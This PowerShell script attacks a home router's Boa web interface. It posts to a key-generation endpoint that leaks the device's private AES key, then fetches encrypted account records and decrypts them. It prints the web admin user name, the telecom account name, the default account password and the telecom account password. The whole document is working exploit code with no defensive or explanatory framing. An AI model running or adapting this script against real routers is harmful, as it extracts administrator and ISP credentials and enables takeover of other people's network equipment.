$ProgressPreference = 'SilentlyContinue'
$base = 'http://192.168.1.1/boaform/'

function HexToBytes([string]$h) {
    if ($h.Length % 2 -ne 0) { throw 'odd hex length' }
    $b = New-Object byte[] ($h.Length / 2)
    for ($i = 0; $i -lt $b.Length; $i++) {
        $b[$i] = [Convert]::ToByte($h.Substring($i * 2, 2), 16)
    }
    return $b
}

function Post($name, $body) {
    Invoke-WebRequest -Uri ($base + $name + '.cgi') -Method POST -Body $body `
        -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing -TimeoutSec 8
}

$keyJson  = (Post 'web_gen_dh_key' 'mode_name=/boaform/web_gen_dh_key&nonedata=0.1&web_dh_pub=').Content | ConvertFrom-Json
$keyHex   = $keyJson.data.auc_private
$userJson = (Post 'web_query_user_show' 'mode_name=/boaform/web_query_user_show&nonedata=0.1').Content | ConvertFrom-Json
$key      = HexToBytes $keyHex

function Dec([string]$hex) {
    if ([string]::IsNullOrWhiteSpace($hex) -or $hex.Length -le 32) { return '<empty>' }
    $iv = HexToBytes $hex.Substring(0, 32)
    $ct = HexToBytes $hex.Substring(32)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'; $aes.Key = $key; $aes.IV = $iv
    try {
        $plain = $aes.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
        return [System.Text.Encoding]::UTF8.GetString($plain)
    } catch {
        return "<decrypt-failed: $($_.Exception.Message)>"
    } finally { $aes.Dispose() }
}

Write-Output ("KEY = " + $keyHex)
foreach ($f in 'web_user_name', 'web_tele_account_name', 'aucDefaultAccountPassword', 'teleAccount_password') {
    Write-Output ("{0,-26} = {1}" -f $f, (Dec $userJson.data.$f))
}
Write-Output ("raw: " + ($userJson.data | ConvertTo-Json -Compress))
